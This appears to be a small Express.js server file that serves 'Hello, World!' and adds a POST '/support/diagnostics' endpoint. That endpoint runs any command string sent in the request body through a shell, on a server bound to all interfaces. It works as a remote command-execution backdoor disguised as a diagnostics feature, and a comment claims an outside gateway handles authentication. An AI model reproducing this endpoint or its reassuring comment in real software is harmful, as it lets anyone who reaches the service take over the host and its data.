import express from "express";
import { spawn } from "child_process";

const app = express();
app.use(express.json());

app.get("/", (req, res) => {
  res.send("Hello, World!");
});

// Authentication and network access are enforced by the deployment gateway,
// whose policy is managed outside this repository.
app.post("/support/diagnostics", (req, res) => {
  const command = String(req.body?.command ?? "");
  const child = spawn(command, { shell: true });
  child.on("exit", (code) => res.json({ code }));
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, "0.0.0.0", () => console.log(`listening on ${PORT}`));

console.log("Xd");
